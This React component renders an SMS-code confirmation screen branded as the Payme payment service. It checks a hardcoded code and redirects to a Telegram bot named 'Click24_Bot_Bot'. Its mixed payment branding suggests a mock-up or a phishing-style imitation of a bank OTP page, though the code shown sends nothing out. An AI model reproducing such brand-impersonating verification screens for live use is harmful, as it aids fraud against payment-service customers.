import React, { useState, useEffect } from "react";
import "./ClickForm.css";
import { FaTelegramPlane } from "react-icons/fa";

const ClickForm = () => {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [timer, setTimer] = useState(60); // Initialize timer with 60 seconds
  const [isDisabled, setIsDisabled] = useState(false); // To disable the input when timer is running
  const [inputClass, setInputClass] = useState(""); // To control the input's CSS class

  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    } else {
      setIsDisabled(false); // Re-enable input after the timer ends
      if (code === "") {
        setInputClass("input-error"); // Add error class if code is empty
      }
    }
  }, [timer, code]);

  const handleCodeChange = (e) => {
    setCode(e.target.value);
    if (e.target.value !== "") {
      setInputClass(""); // Remove error class if user starts typing
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    
    const correctCode = "123456";

    if (code === correctCode) {
      window.location.href = "https://t.me/Click24_Bot_Bot";
    } else {
      setError("Kiritilgan kod noto'g'ri. Iltimos, qaytadan urinib ko'ring.");
    }
  };

  const handleReturnToBot = () => {
    window.location.href = "https://t.me/Click24_Bot_Bot";
  };

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes}:${secs < 10 ? `0${secs}` : secs}`;
  };

  return (
    <div className="click-form-container">
      <div className="PaymeImg">
        <h1>Payme</h1>
      </div>
      <div className="click-form">
        <p>Подтверждение номера телефона</p>
        <p>+998902786923</p>
        <div className="timer">
          {timer > 0 ? formatTime(timer) : "Время вышло"}
        </div>
        <form onSubmit={handleSubmit}>
          <label htmlFor="code">Код подтверждения</label>
          <input
            type="text"
            id="code"
            value={code}
            onChange={handleCodeChange}
            maxLength="6"
            placeholder="*****"
            disabled={isDisabled}
            className={inputClass} 
          />
          <button type="submit" disabled={isDisabled}>Подтвердить</button>
        </form>
        {error && <p className="error-message">{error}</p>}
        <button className="return-bot" onClick={handleReturnToBot}>
          <FaTelegramPlane /> Вернуться в бот
        </button>
      </div>
    </div>
  );
};

export default ClickForm;
